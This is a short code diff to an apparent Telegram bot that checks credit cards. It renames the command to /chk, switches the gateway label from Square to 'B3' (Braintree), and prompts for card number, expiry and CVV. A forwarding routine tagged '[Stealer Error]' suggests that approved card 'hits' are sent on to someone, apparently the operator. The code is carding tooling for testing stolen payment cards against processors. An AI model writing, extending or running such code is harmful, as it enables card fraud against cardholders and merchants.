@@ -19,13 +19,13 @@ async def send_hit_if_approved(client: Client, text: str):
     except Exception as e:
         print(f"[Stealer Error] Failed to forward: {e}")
 
-@Client.on_message(filters.command("cl", [".", "/"]))
+@Client.on_message(filters.command("chk", [".", "/"]))
 async def stripe_auth_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
         checkall = await check_all_thing(Client, message)
 
-        gateway = "Square Auth"
+        gateway = "B3  Auth"
 
         if checkall[0] == False:
             return
@@ -35,11 +35,11 @@ async def stripe_auth_cmd(Client, message):
         if getcc == False:
             resp = f"""<b>
 Gate Name: {gateway} ♻️
-CMD: /cl
+CMD: /chk
 
 Message: No CC Found in your input ❌
 
-Usage: /cl cc|mes|ano|cvv</b>"""
+Usage: /chk cc|mes|ano|cvv</b>"""
             await message.reply_text(resp, message.id)
             return
 
